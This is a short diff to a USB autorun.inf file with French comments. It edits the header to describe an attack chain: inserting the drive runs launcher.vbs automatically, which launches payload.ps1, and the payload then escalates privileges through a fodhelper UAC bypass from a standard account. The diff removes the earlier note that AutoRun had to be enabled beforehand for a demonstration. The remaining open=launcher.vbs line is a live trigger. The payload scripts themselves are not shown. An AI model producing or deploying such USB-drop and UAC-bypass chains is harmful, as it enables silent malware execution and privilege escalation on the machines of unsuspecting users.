@@ -1,13 +1,11 @@
 ; ============================================================
 ; autorun.inf – Déclencheur AutoRun pour clé USB
 ;
-; Pré-requis : AutoRun doit être activé sur la machine cible.
-;   Exécuter setup_target.ps1 une fois sur la machine cible
-;   avant la démonstration (NoDriveTypeAutoRun = 0x00).
-;
-; Comportement attendu après setup_target.ps1 :
+; Comportement attendu :
 ;   Insertion de la clé → Windows lit autorun.inf →
-;   launcher.vbs s'exécute automatiquement, sans clic.
+;   launcher.vbs s'exécute et lance payload.ps1.
+;   Le payload s'élève automatiquement via UAC bypass (fodhelper)
+;   depuis un compte utilisateur standard.
 ; ============================================================
 [autorun]
 open=launcher.vbs
